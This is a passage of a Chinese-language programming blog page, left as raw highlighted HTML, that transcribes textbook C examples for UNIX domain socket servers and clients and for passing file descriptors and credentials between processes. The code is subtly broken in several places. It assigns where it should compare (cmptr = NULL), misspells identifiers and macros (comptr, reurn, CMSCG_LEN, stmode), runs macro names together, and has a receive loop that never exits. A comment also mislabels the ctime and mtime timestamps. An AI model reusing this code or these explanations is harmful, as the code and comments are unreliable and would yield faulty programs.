class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STALE 30</span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">serve_accept</span><span class="hljs-params">(<span class="hljs-type">int</span> listenfd, <span class="hljs-type">uid_t</span> *uidptr)</span><br>&#123;<br>    <span class="hljs-type">int</span> clifd, err, rval;<br>    <span class="hljs-type">socklen_t</span> len;<br>    <span class="hljs-type">time_t</span> staletime;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">statbuf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">un</span>;</span><br>    <span class="hljs-type">char</span> *name;<br><br>    <span class="hljs-keyword">if</span> ((name = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(un.sun_path) + <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    len = <span class="hljs-keyword">sizeof</span>(un);<br>    <span class="hljs-keyword">if</span> ((clifd = accept(listenfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;un, &amp;len)) &lt; <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//等到客户端的请求</span><br>        <span class="hljs-built_in">free</span>(name);<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-2</span>);<br>    &#125;<br><br>    len -= offsetof(<span class="hljs-keyword">struct</span> sockaddr_un, sun_path);<br>    <span class="hljs-built_in">memcpy</span>(name, un.sun_path, len); <span class="hljs-comment">//客户端的地址</span><br>    name[len] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (stat(name, &amp;statbuf) &lt; <span class="hljs-number">0</span>) &#123; <br>        rval = <span class="hljs-number">-3</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> S_ISSOCK</span><br>    <span class="hljs-keyword">if</span> (S_ISSOCK(statbuf.stmode) == <span class="hljs-number">0</span>) &#123;<br>        rval = <span class="hljs-number">-4</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> </span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        S_IRWXG：(S_IRGRP | S_IWGRP | S_IXGRP)</span><br><span class="hljs-comment">        S_IRGRP：文件的组所有者的读取权限位。通常是040</span><br><span class="hljs-comment">        S_IWGRP：文件的组所有者的写许可权位。通常为020</span><br><span class="hljs-comment">        S_IXGRP：执行或搜索文件组所有者的权限位。通常是010</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        S_IRWXO：(S_IROTH | S_IWOTH | S_IXOTH)</span><br><span class="hljs-comment">        S_IROTH：其他用户的读取权限位。通常是04</span><br><span class="hljs-comment">        S_IWOTH：其他用户的写许可权位。通常是02</span><br><span class="hljs-comment">        S_IXOTH：对其他用户执行或搜索权限位。通常是01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        S_IRWXU：(S_IRUSR | S_IWUSR | S_IXUSR)</span><br><span class="hljs-comment">        S_IRUSR：文件所有者的读取权限位。在许多系统上，该位为0400</span><br><span class="hljs-comment">        S_IWUSR：文件所有者的写许可权位。通常为0200</span><br><span class="hljs-comment">        S_IXUSR：对文件所有者执行（对于普通文件）或搜索（对于目录）权限位。通常为0100。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> ((statbuf.st_mode &amp; (S_IRWXG | S_IRWXO)) ||<br>        (statbuf.st_mode &amp; S_IRWXU) != S_IRWXU) &#123;<br>            rval = <span class="hljs-number">-5</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>    <br>    staletime = time(<span class="hljs-literal">NULL</span>) - STALE;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        atime:最后访问时间</span><br><span class="hljs-comment">        ctime:最后修改时间</span><br><span class="hljs-comment">        mtime:文件状态修改时间</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (statbuf.st_atime &lt; staletime || <br>        statbuf.st_ctime &lt; staletime ||<br>        statbuf.st_mtime &lt; staletime) &#123;<br>            rval = <span class="hljs-number">-6</span>;<br>            <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (uidptr != <span class="hljs-literal">NULL</span>)<br>        *uidptr = statbuf.st_uid;<br>    unlink(name); <span class="hljs-comment">//删除客户端的地址</span><br>    <span class="hljs-built_in">free</span>(name);<br>    <span class="hljs-keyword">return</span>(clifd);<br><br>errout:<br>    err = errno;<br>    close(clifd);<br>    <span class="hljs-built_in">free</span>(name);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(rval);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="cli-conn"><a href="#cli-conn" class="headerlink" title="cli_conn"></a>cli_conn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLI_PATH <span class="hljs-string">&quot;/var/tmp&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLI_PERM S_IRWXU    </span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">cli_conn</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, len, err, rval;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">un</span>, <span class="hljs-title">sun</span>;</span><br>    <span class="hljs-type">int</span> do_unlink = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) &gt;= <span class="hljs-keyword">sizeof</span>(un.sun_path)) &#123;<br>        errno = ENAMETOOLONG;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fd = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//创建套接字</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">-1</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(&amp;un, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(un));<br>    un.sun_family = AF_UNIX;<br>    <span class="hljs-built_in">sprintf</span>(un.sun_path, <span class="hljs-string">&quot;%s%05ld&quot;</span>, CLI_PATH, (<span class="hljs-type">long</span>)getpid()); <span class="hljs-comment">//创建客户端的地址</span><br>    len = offsetof(<span class="hljs-keyword">struct</span> sockaddr_un, sun_path) + <span class="hljs-built_in">strlen</span>(un.sun_path);<br><br>    unlink(un.sun_path); <span class="hljs-comment">//防止文件已经存在</span><br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;un, len) &lt; <span class="hljs-number">0</span>) &#123;<br>        rval = <span class="hljs-number">-2</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (chmod(un.sun_path, CLI_PERM) &lt; <span class="hljs-number">0</span>) &#123;<br>        rval = <span class="hljs-number">-3</span>;<br>        do_unlink = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;sun, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sun));<br>    sun.sun_family = AF_UNIX;<br>    <span class="hljs-built_in">strcpy</span>(sun.sun_path, name);<br>    len = offsetof(<span class="hljs-keyword">struct</span> sockaddr_un, sun_path) + <span class="hljs-built_in">strlen</span>(name);<br>    <span class="hljs-keyword">if</span> (connect(fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sun, len) &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//连接服务器的地址</span><br>        rval = <span class="hljs-number">-4</span>;<br>        do_unlink = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fd);<br><br>errout:<br>    err = errno;<br>    close(fd);<br>    <span class="hljs-keyword">if</span> (do_unlink)<br>        unlink(un.sun_path);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(rval);   <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="传送文件描述符"><a href="#传送文件描述符" class="headerlink" title="传送文件描述符"></a>传送文件描述符</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">send_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> fd_to_send)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">send_err</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> status, <span class="hljs-type">char</span> *errmsg)</span>;<br><span class="hljs-comment">//若成功，返回0；若出错，返回-1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">recv_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">ssize_t</span> (*userfunc)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>))</span>;<br><span class="hljs-comment">//返回值：若成功，返回文件描述符；若出错，返回负值</span><br></code></pre></td></tr></table></figure><p><strong>msghdr结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> &#123;</span><br>    <span class="hljs-type">void</span> *msg_name; <span class="hljs-comment">/* 可选地址 */</span><br>    <span class="hljs-type">socklen_t</span> msg_namelen; <span class="hljs-comment">/* 地址长度 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">msg_iov</span>;</span> <span class="hljs-comment">/* I/O缓冲区列表 */</span><br>    <span class="hljs-type">int</span> msg_iovlen; <span class="hljs-comment">/* 列表的个数 */</span><br>    <span class="hljs-type">void</span> *msg_control; <span class="hljs-comment">/* 辅助数据 */</span><br>    <span class="hljs-type">socklen_t</span> msg_controllen; <span class="hljs-comment">/* 辅助字节数 */</span><br>    <span class="hljs-type">int</span> msg_flags; <span class="hljs-comment">/* 收到消息的标志 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>msg_control字段指向cmsghdr</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> &#123;</span><br>    <span class="hljs-type">socklen_t</span> cmsg_len; <span class="hljs-comment">/* 数据字节数， 包括头部 */</span><br>    <span class="hljs-type">int</span> cmsg_level; <span class="hljs-comment">/* 协议 */</span><br>    <span class="hljs-type">int</span> cmsg_type; <span class="hljs-comment">/* 协议指定类型 */</span><br>    <span class="hljs-comment">/* followed by the actual control message data */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="访问控制数据"><a href="#访问控制数据" class="headerlink" title="访问控制数据"></a>访问控制数据</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">CMSG_DATA</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> cmsghdr *cp)</span>;<br><span class="hljs-comment">//返回值：返回一个指针，指向与cmsghdr结构相关联的数据</span><br><span class="hljs-keyword">struct</span> cmsghdr *<span class="hljs-title function_">CMSG_FIRSTHDR</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msghdr *mp)</span>;<br><span class="hljs-comment">//返回值：返回一个指针，指向与msghdr结构相关联的第一个cmsghdr结构;若无这样的结构，返回NULL</span><br><span class="hljs-keyword">struct</span> cmsghdr *<span class="hljs-title function_">CMSG_NXTHDR</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msghdr *mp, <span class="hljs-keyword">struct</span> cmsghdr *cp)</span>;<br><span class="hljs-comment">//返回值：返回一个指针，指向与msghdr结构相关联的下一个cmsghdr结构，该msghdr结构给出了当前的cmsghdr结构;若当前cmsghdr结构已是最后一个，返回NULL</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">CMSG_LEN</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nbytes)</span>;<br><span class="hljs-comment">//返回值：返回为nbytes长的数据对象分配的长度</span><br></code></pre></td></tr></table></figure><p><strong>17-13.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SCM_CREDS)<span class="hljs-comment">/* BSD interface */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCTcmsgcred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPESCM_CREDS</span><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(SCM_CREDENTIALS)<span class="hljs-comment">/* Linux interface */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSTRUCTucred</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCM_CREDTYPESCM_CREDENTIALS</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RIGHTSLENCMSG_LEN(sizeof(int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREDSLENCMSG_LEN(sizeof(struct CREDSTRUCT))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>CONTROLLEN(RIGHTSLEN + CREDSLEN)</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span>*<span class="hljs-title">cmptr</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">send_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> fd_to_send)</span> <span class="hljs-comment">//用于发送文件描述符</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[1];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">2</span>];<br><br>    iov[<span class="hljs-number">0</span>].iov_base = buf;<br>    iov[<span class="hljs-number">0</span>].iov_len = <span class="hljs-number">2</span>;<br>    msg.msg_iov = iov;<br>    msg.msg_name = <span class="hljs-literal">NULL</span>;<br>    msg.msg_namelen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (fd_to_send &lt; <span class="hljs-number">0</span>) &#123;<br>        msg.msg_control = <span class="hljs-literal">NULL</span>;<br>        msg.msg_controllen = <span class="hljs-number">0</span>;<br>        buf[<span class="hljs-number">1</span>] = -fd_to_send;<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>)<br>            buf[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (cmptr = <span class="hljs-literal">NULL</span> &amp;&amp; (cmptr = <span class="hljs-built_in">malloc</span>(CONTROLLEN)) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        cmptr-&gt;cmsg_level = SOL_SOCKET;<br>        cmptr-&gt;cmsg_type = SCM_RIGHTS;<br>        cmptr-&gt;cmsg_len = CONTROLLEN;<br>        msg.msg_control = cmptr;<br>        msg.msg_controllen = CONTROLLEN;<br>        *(<span class="hljs-type">int</span> *)CMSG_DATA(comptr) = fd_to_send;<br>        buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (sendmsg(fd, &amp;msg, <span class="hljs-number">0</span>) != <span class="hljs-number">2</span>)<br>        reurn(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>17-14.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CONTROLLEN CMSCG_LEN(sizeof(int))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 256</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmptr</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">recv_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">ssize_t</span> (*userfunc)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>))</span> <span class="hljs-comment">//fd是域套接字</span><br>&#123;<br>    <span class="hljs-type">int</span> newfd, nr, status;<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">char</span> buf[MAXLINE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[1];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br><br>    status = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        iov[<span class="hljs-number">0</span>].iov_base = buf;<br>        iov[<span class="hljs-number">0</span>].iov_len = <span class="hljs-keyword">sizeof</span>(buf);<br>        msg.msg_iov = iov;<br>        msg.msg_iovlen = <span class="hljs-number">1</span>;<br>        msg.msg_name = <span class="hljs-literal">NULL</span>;<br>        msg.msg_namelen = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (cmptr == <span class="hljs-literal">NULL</span> &amp;&amp; (cmptr = <span class="hljs-built_in">malloc</span>(CONTROLLEN)) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        msg.msg_control = cmptr;<br>        msg.msg_controllen = CONTROLLEN;<br>        <span class="hljs-keyword">if</span> ((nr = recvmsg(fd, &amp;msg, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;recvmsg error\n&quot;</span>);<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;connection closed by servver&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span> (ptr = buf; ptr &lt; &amp;buf[nr];) &#123;<br>            <span class="hljs-keyword">if</span> (*ptr++ == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//读取状态</span><br>                <span class="hljs-keyword">if</span> (ptr != &amp;buf[nr<span class="hljs-number">-1</span>])<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;message format error&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>                status = *ptr &amp; <span class="hljs-number">0xFF</span>;<br>                <span class="hljs-keyword">if</span> (status == <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">if</span> (msg.msg_controllen &lt; CONTROLLEN)<br>                    &#123;<br>                        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;status = 0 but no fd&quot;</span>);<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                    &#125;<br>                    newfd = *(<span class="hljs-type">int</span> *)CMSG_DATA(cmptr);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    newfd = -status;<br>                &#125;<br>                nr -= <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nr &gt; <span class="hljs-number">0</span> &amp;&amp; (*userfunc)(STDERR_FILENO, buf, nr) != nr)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (status &gt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(newfd);<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>FreeBSD</code>中，将证书作为<code>cmsgcred</code>结构传送</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMGROUP_MAX 16</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsgcred</span> &#123;</span><br>    <span class="hljs-type">pid_t</span> cmcred_pid; <span class="hljs-comment">/* sender’s process ID */</span><br>    <span 